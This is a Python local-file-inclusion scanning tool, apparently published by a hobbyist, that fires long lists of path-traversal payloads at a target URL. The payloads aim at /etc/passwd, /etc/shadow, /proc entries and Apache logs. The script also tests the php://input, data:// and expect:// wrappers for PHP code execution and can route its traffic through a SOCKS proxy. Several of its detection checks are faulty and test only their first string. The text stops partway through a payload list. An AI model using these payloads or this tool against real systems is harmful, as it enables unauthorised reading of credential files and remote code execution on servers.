#!/usr/bin/python3
import requests
from colorama import Fore,Back
from colorama import init
init(autoreset = True)
import re
from re import MULTILINE
import argparse
import time



def check_http(url):
	if("http://" not in url and "https://" not in url):
		return "http://%s" %url
	return url


def user_agent():
    user_a = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
    'Accept-Language': 'en-US;',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'text/html,application/xhtml+xml,application/xml;',
    'Connection': 'close'
    }
    return user_a

banner_t = r"""     

                    +++++++++++++++++++++++++++++++++++++++++++++++++++++
                    #    LFI Scanner - AWS-LFI (AWS-36)                 #
                    #    Version 1.0                                    #
                    #    Github : https://github.com/NosTaMod           #
                    #    Telegram : https://t.me/NosTaMod               #
                    #    Youtube : https://www.youtube.com/c/NosTaMod   #
                    #    Code By : Hasibul Hasan Rabbi (NosTa)          #
                    #                                                   #
                    #  Dorkari Soft IT Solutions-Fathers of Technology  #
                    +++++++++++++++++++++++++++++++++++++++++++++++++++++

            """

def banner(banner):
    for x in banner:
        print(Fore.LIGHTCYAN_EX + x, end='', flush=True)
        time.sleep(0.002)
    print()


parser = argparse.ArgumentParser()
parser.add_argument('-u','--URL' ,help='Vulnerability Url Site ')
parser.add_argument('-d','--DEEP' ,help='Deep Scan for Vulnerability ', action="store_true")
parser.add_argument('-s','--SELF' ,help='Self Directories Scan for Vulnerability ', action="store_true")
parser.add_argument('-f','--FD' ,help='FD Directories Scan for Vulnerability ', action="store_true")
parser.add_argument('-l','--LOG' ,help='Log File Scan for Vulnerability ', action="store_true")
parser.add_argument('-e','--ETC' ,help='etc Directories Scan for Vulnerability ', action="store_true")
parser.add_argument('-p','--PROXY' ,help='Set Proxy Socks : -p 127.0.0.1:9150 or -p 127.0.0.1:9050' )
args = parser.parse_args()



def open_file(path):
    try:
        file = open(path, 'r').readlines()
        return file
    except:
        print(Fore.YELLOW+"Can't Open The File Path !")

etc_file = []
self_file = []
log_file = []
fd_file = []

def find_etc(url,path,proxy = None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None

    global etc_file
    for payload in path:
        try:
            r = requests.get(url+payload.strip(), proxies=proxies, headers=user_agent())
            if r.status_code == 200:
                if ("root:x" or "daemon:" or "games:" or "root:x:0:" or "daemon:x:1:" or "bin:x:2:" or "sys:x:3:" or "127.0.0.1    localhost") in r.text:
                    print(Fore.LIGHTCYAN_EX+'[+]'+Fore.LIGHTGREEN_EX+' Vulnerable '+url+payload)
                    etc_file.append(url+payload)
                    r.close()
                else:
                    print(Fore.LIGHTCYAN_EX+'[-]'+Fore.RED+' Not Vulnerable '+url+payload)
            else:
                print(Fore.LIGHTYELLOW_EX+"Site Erorred !")
        except (KeyboardInterrupt, SystemExit , ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError, ConnectionError):
            print(Fore.LIGHTYELLOW_EX+"Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
            raise

def find_self(url,path,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None
    global self_file

    for payload in path:
        try:
            r = requests.get(url+payload.strip(), proxies=proxies, headers=user_agent())
            if r.status_code == 200:
                if ('DOCUMENT_ROOT' or 'HTTP_USER_AGENT' or 'HTTP_ACCEPT' or 'HTTP_ACCEPT_ENCODING' or 'HTTP_ACCEPT_LANGUAGE' or 'HTTP_REFERER' or 'HTTP_CONNECTION' or 'SERVER_NAME' or 'SCRIPT_FILENAME' or 'REMOTE_PORT' or 'LS_COLORS' or 'SERVER_SOFTWARE' or 'REQUEST_METHOD' or 'HTTP_COOKIE' or 'HOME=/home/' or 'gcc version' or 'SSH_CONNECTION=' or 'BOOT_IMAGE=' or '/dev/sda1' or 'name=systemd' or 'local_address' or 'rem_address') in r.text:
                    print(Fore.LIGHTCYAN_EX+'[+]'+Fore.LIGHTGREEN_EX+' Vulnerable '+url+payload)
                    self_file.append(url+payload)
                    r.close()
                else:
                    print(Fore.LIGHTCYAN_EX+'[-]'+Fore.RED+' Not Vulnerable '+url+payload)
            else:
                print(Fore.LIGHTYELLOW_EX+"Site Erorred !")
        except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError,ConnectionError):
            print(Fore.LIGHTYELLOW_EX+"Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
            raise
def find_log(url,path,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None
    global log_file

    for payload in path:
        try:
            r = requests.get(url+payload.strip(), proxies=proxies, headers=user_agent())
            if r.status_code == 200:
                if ('[notice]' or '[error]' or 'GET /' or 'HTTP/1.1') in r.text:
                    print(Fore.LIGHTCYAN_EX+'[+]'+Fore.LIGHTGREEN_EX+' Vulnerable '+url+payload)
                    log_file.append(url+payload)
                    r.close()

                else:
                    print(Fore.LIGHTCYAN_EX+'[-]'+Fore.RED+' Not Vulnerable '+url+payload)
            else:
                print(Fore.LIGHTYELLOW_EX+"Site Erorred !")
        except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError,ConnectionError):
            print(Fore.LIGHTYELLOW_EX+"Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
            raise


#ok
def input_wrap(url,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None

    code1 = '<?php echo "Gray_Security";?>'
    try:
        r = requests.post(url+'php://input', data=code1, proxies=proxies, headers=user_agent())
        if r.status_code ==200:
            if "Gray_Security" in r.text:
                print(Back.CYAN + "Input Inject :")
                print(Fore.LIGHTGREEN_EX+'[+] '+url+'php://input')
                r.close()
            else:
                print(Fore.YELLOW+'[-]'+Fore.RED+' Not Vulener input')
        else:
            print(Fore.LIGHTYELLOW_EX + "Site Erorred !")
    except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError,ConnectionError):
        print(Fore.LIGHTYELLOW_EX + "Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
        raise

def data_wrap(url,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None

    code = 'PD9waHAgZWNobyAiR3JheV9TZWN1cml0eSI7Pz4='
    try:
        r = requests.get(url+'data://text/plain;base64,'+code, proxies=proxies, headers=user_agent())
        if r.status_code == 200:
            if "Gray_Security" in r.text:
                print(Back.CYAN + "Data Inject :")
                print(Fore.LIGHTGREEN_EX+'[+] '+url+'data://text/plain;base64,'+code)
                r.close()
            else:
                print(Fore.YELLOW+'[-]'+Fore.RED+' Not Vulener data:')
        else:
            print(Fore.LIGHTYELLOW_EX + "Site Erorred !")
    except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError,ConnectionError):
        print(Fore.LIGHTYELLOW_EX + "Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
        raise

def expect_wrap(url,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None

    try:
        r = requests.get(url+'expect://id',proxies=proxies, headers=user_agent())
        if r.status_code == 200:
            if ("uid=" or "gid="  or "groups=") in r.text:
                print(Back.CYAN + "Expect Inject :")
                print(Fore.LIGHTGREEN_EX +'[+] '+url+'expect://id')
                r.close()
            else:
                print(Fore.YELLOW+'[-]'+Fore.RED+' Not Vulener expect:')
        else:
            print(Fore.LIGHTYELLOW_EX + "Site Erorred !")

    except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError,ConnectionError):
        print(Fore.LIGHTYELLOW_EX + "Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
        raise

def find_fd(url,path,proxy=None):
    if proxy !=None:
        proxies = {
        'http': 'socks5h://{}'.format(proxy),
        'https': 'socks5h://{}'.format(proxy)
        }
    else:
        proxies = None
    global fd_file

    for payload in path:
        try:
            r = requests.get(url+payload.strip(), proxies=proxies, headers=user_agent())
            if r.status_code == 200:
                if ('TracerPid:' or 'State:') in r.text:
                    print(Fore.LIGHTCYAN_EX+'[+]'+Fore.LIGHTGREEN_EX+' Vulnerable '+url+payload)
                    fd_file.append(url+payload)
                    r.close()
                elif ('referer:' or '[error] [client') in r.text:
                    print(Fore.LIGHTCYAN_EX+'[+]'+Fore.LIGHTGREEN_EX+' Vulnerable '+url+payload)
                    fd_file.append(url+payload)
                    r.close()
                else:
                    print(Fore.LIGHTCYAN_EX+'[-]'+Fore.RED+' Not Vulnerable '+url+payload)
            else:
                print(Fore.LIGHTYELLOW_EX+"Site Erorred !")
        except (KeyboardInterrupt, SystemExit, ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError, ConnectionError):
            print(Fore.LIGHTYELLOW_EX+"Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
            raise
def fast_scan(url,proxy):
    pa_etc = ['/etc/passwd',
              '../../../../../../../../../../../../etc/passwd',
              '/etc/passwd%00',
              '../../../../../../../../../../../../etc/passwd%00',
              '//etc/passwd',
'//etc/passwd%00',
'////etc/passwd',
'////etc/passwd%00',
'%252fetc%252fpasswd',
'%252fetc%252fpasswd%00',
'%c0%ae/etc/passwd',
'%c0%ae/etc/passwd%00',
'/%5C../etc/passwd',
'/%5C../etc/passwd%00',
'....//etc/passwd',
'....//....//etc/passwd',
'file:///etc/passwd%00',
'%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'/etc/passwd',
'../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../etc/passwd',
'/etc/passwd%00',
'../etc/passwd%00',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../etc/passwd%00',
'%2Fetc/passwd',
'..%2Fetc/passwd',
'..%2F..%2Fetc/passwd',
'..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd',
'%2Fetc/passwd%00',
'..%2Fetc/passwd%00',
'..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd%00',
'%2Fetc%2Fpasswd',
'%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd',
'%2Fetc%2Fpasswd%00',
'%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2F%2E2E%2Fetc%2Fpasswd%00',
'%252fetc%252fpasswd',
'%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
'%252fetc%252fpasswd%00',
'%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
'/etc/shadow',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'/etc/group',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'/etc/shadow%00',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'/etc/group%00',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'/etc/hosts',
'../etc/hosts',
'../../etc/hosts',
'../../../etc/hosts',
'../../../../etc/hosts',
'../../../../../etc/hosts',
'../../../../../../etc/hosts',
'../../../../../../../etc/hosts',
'../../../../../../../../etc/hosts',
'../../../../../../../../../etc/hosts',
'../../../../../../../../../../etc/hosts',
'../../../../../../../../../../../etc/hosts',
'../../../../../../../../../../../../etc/hosts',
'../../../../../../../../../../../../../etc/hosts',
'../../../../../../../../../../../../../../etc/hosts',
'/etc/hosts%00',
'../etc/hosts%00',
'../../etc/hosts%00',
'../../../etc/hosts%00',
'../../../../etc/hosts%00',
'../../../../../etc/hosts%00',
'../../../../../../etc/hosts%00',
'../../../../../../../etc/hosts%00',
'../../../../../../../../etc/hosts%00',
'../../../../../../../../../etc/hosts%00',
'../../../../../../../../../../etc/hosts%00',
'../../../../../../../../../../../etc/hosts%00',
'../../../../../../../../../../../../etc/hosts%00',
'../../../../../../../../../../../../../etc/hosts%00',
'../../../../../../../../../../../../../../etc/hosts%00']

    pa_log = ["/var/log/access_log", "../../../../../../../../../../../var/log/access_log",
              "/var/log/access_log%00", "../../../../../../../../../../../var/log/access_log%00",
              "/apache/logs/access.log", "../../../../../../../../../../../apache/logs/access.log",
              "/apache/ogs/access.log%00", "../../../../../../../../../../../apache/logs/access.log%00",
              '/apache/logs/access.log',
'../apache/logs/access.log',
'../../apache/logs/access.log',
'../../../apache/logs/access.log',
'../../../../apache/logs/access.log',
'../../../../../apache/logs/access.log',
'../../../../../../apache/logs/access.log',
'../../../../../../../apache/logs/access.log',
'../../../../../../../../apache/logs/access.log',
'/apache/logs/error.log',
'../apache/logs/error.log',
'../../apache/logs/error.log',
'../../../apache/logs/error.log',
'../../../../apache/logs/error.log',
'../../../../../apache/logs/error.log',
'../../../../../../apache/logs/error.log',
'../../../../../../../apache/logs/error.log',
'../../../../../../../../apache/logs/error.log',
'/apache2/logs/error.log',
'../apache2/logs/error.log',
'../../apache2/logs/error.log',
'../../../apache2/logs/error.log',
'../../../../apache2/logs/error.log',
'../../../../../apache2/logs/error.log',
'../../../../../../apache2/logs/error.log',
'../../../../../../../apache2/logs/error.log',
'../../../../../../../../apache2/logs/error.log',
'/etc/httpd/logs/access.log',
'../etc/httpd/logs/access.log',
'../../etc/httpd/logs/access.log',
'../../../etc/httpd/logs/access.log',
'../../../../etc/httpd/logs/access.log',
'../../../../../etc/httpd/logs/access.log',
'../../../../../../etc/httpd/logs/access.log',
'../../../../../../../etc/httpd/logs/access.log',
'../../../../../../../../etc/httpd/logs/access.log',
'../../../../../../../../../etc/httpd/logs/access.log',
'/etc/httpd/logs/access_log',
'../etc/httpd/logs/access_log',
'../../etc/httpd/logs/access_log',
'../../../etc/httpd/logs/access_log',
'../../../../etc/httpd/logs/access_log',
'../../../../../etc/httpd/logs/access_log',
'../../../../../../etc/httpd/logs/access_log',
'../../../../../../../etc/httpd/logs/access_log',
'../../../../../../../../etc/httpd/logs/access_log',
'../../../../../../../../../etc/httpd/logs/access_log',
'/etc/httpd/logs/error_log',
'../etc/httpd/logs/error_log',
'../../etc/httpd/logs/error_log',
'../../../etc/httpd/logs/error_log',
'../../../../etc/httpd/logs/error_log',
'../../../../../etc/httpd/logs/error_log',
'../../../../../../etc/httpd/logs/error_log',
'../../../../../../../etc/httpd/logs/error_log',
'../../../../../../../../etc/httpd/logs/error_log',
'../../../../../../../../../etc/httpd/logs/error_log',
'/usr/local/apache/logs/access_log',
'../usr/local/apache/logs/access_log',
'../../usr/local/apache/logs/access_log',
'../../../usr/local/apache/logs/access_log',
'../../../../usr/local/apache/logs/access_log',
'../../../../../usr/local/apache/logs/access_log',
'../../../../../../usr/local/apache/logs/access_log',
'../../../../../../../usr/local/apache/logs/access_log',
'../../../../../../../../usr/local/apache/logs/access_log',
'../../../../../../../../../usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'../usr/local/apache/logs/access.log',
'../../usr/local/apache/logs/access.log',
'../../../usr/local/apache/logs/access.log',
'../../../../usr/local/apache/logs/access.log',
'../../../../../usr/local/apache/logs/access.log',
'../../../../../../usr/local/apache/logs/access.log',
'../../../../../../../usr/local/apache/logs/access.log',
'../../../../../../../../usr/local/apache/logs/access.log',
'../../../../../../../../../usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'../usr/local/apache/logs/error_log',
'../../usr/local/apache/logs/error_log',
'../../../usr/local/apache/logs/error_log',
'../../../../usr/local/apache/logs/error_log',
'../../../../../usr/local/apache/logs/error_log',
'../../../../../../usr/local/apache/logs/error_log',
'../../../../../../../usr/local/apache/logs/error_log',
'../../../../../../../../usr/local/apache/logs/error_log',
'../../../../../../../../../usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'../usr/local/apache/logs/error.log',
'../../usr/local/apache/logs/error.log',
'../../../usr/local/apache/logs/error.log',
'../../../../usr/local/apache/logs/error.log',
'../../../../../usr/local/apache/logs/error.log',
'../../../../../../usr/local/apache/logs/error.log',
'../../../../../../../usr/local/apache/logs/error.log',
'../../../../../../../../usr/local/apache/logs/error.log',
'../../../../../../../../../usr/local/apache/logs/error.log',
'/var/log/httpd/access_log',
'../var/log/httpd/access_log',
'../../var/log/httpd/access_log',
'../../../var/log/httpd/access_log',
'../../../../var/log/httpd/access_log',
'../../../../../var/log/httpd/access_log',
'../../../../../../var/log/httpd/access_log',
'../../../../../../../var/log/httpd/access_log',
'../../../../../../../../var/log/httpd/access_log',
'../../../../../../../../../var/log/httpd/access_log',
'/var/log/httpd/error_log',
'../var/log/httpd/error_log',
'../../var/log/httpd/error_log',
'../../../var/log/httpd/error_log',
'../../../../var/log/httpd/error_log',
'../../../../../var/log/httpd/error_log',
'../../../../../../var/log/httpd/error_log',
'../../../../../../../var/log/httpd/error_log',
'../../../../../../../../var/log/httpd/error_log',
'../../../../../../../../../var/log/httpd/error_log',
'/etc/httpd/logs/error.log',
'../etc/httpd/logs/error.log',
'../../etc/httpd/logs/error.log',
'../../../etc/httpd/logs/error.log',
'../../../../etc/httpd/logs/error.log',
'../../../../../etc/httpd/logs/error.log',
'../../../../../../etc/httpd/logs/error.log',
'../../../../../../../etc/httpd/logs/error.log',
'../../../../../../../../etc/httpd/logs/error.log',
'../../../../../../../../../etc/httpd/logs/error.log'
'/etc/httpd/logs/acces.log',
'../etc/httpd/logs/acces.log',
'../../etc/httpd/logs/acces.log',
'../../../etc/httpd/logs/acces.log',
'../../../../etc/httpd/logs/acces.log',
'../../../../../etc/httpd/logs/acces.log',
'../../../../../../etc/httpd/logs/acces.log',
'../../../../../../../etc/httpd/logs/acces.log',
'../../../../../../../../etc/httpd/logs/acces.log',
'../../../../../../../../../etc/httpd/logs/acces.log',
'/var/www/logs/access.log',
'../var/www/logs/access.log',
'../../var/www/logs/access.log',
'../../../var/www/logs/access.log',
'../../../../var/www/logs/access.log',
'../../../../../var/www/logs/access.log',
'../../../../../../var/www/logs/access.log',
'../../../../../../../var/www/logs/access.log',
'../../../../../../../../var/www/logs/access.log',
'../../../../../../../../../var/www/logs/access.log',
'/var/www/logs/error.log',
'../var/www/logs/error.log',
'../../var/www/logs/error.log',
'../../../var/www/logs/error.log',
'../../../../var/www/logs/error.log',
'../../../../../var/www/logs/error.log',
'../../../../../../var/www/logs/error.log',
